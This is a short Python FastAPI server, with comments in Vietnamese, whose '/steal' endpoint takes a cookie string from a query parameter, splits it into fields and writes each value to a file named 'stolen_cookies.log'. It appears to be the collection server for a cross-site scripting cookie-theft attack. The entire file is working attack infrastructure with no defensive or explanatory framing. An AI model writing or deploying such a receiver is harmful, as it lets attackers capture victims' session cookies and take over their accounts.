from fastapi import FastAPI, Request, Query
import logging
from typing import Optional

app = FastAPI()

# Cấu hình logging để lưu log cookie đã phân tích
logging.basicConfig(filename="stolen_cookies.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def parse_cookie(cookie_str: str) -> dict:
    cookies = {}
    for pair in cookie_str.split(";"):
        if "=" in pair:
            key, value = pair.strip().split("=", 1)
            cookies[key] = value
    return cookies

@app.get("/steal")
async def steal_cookie(cookie: Optional[str] = Query(default="")):
    parsed_cookies = parse_cookie(cookie)
    
    if not parsed_cookies:
        logging.info("No cookie data received.")
        return {"message": "No valid cookie data."}

    logging.info("Received cookies:")
    for key, value in parsed_cookies.items():
        logging.info(f"{key} = {value}")
        print(f"{key} = {value}")

    return {"message": "Cookie fields received and logged.", "fields": parsed_cookies}
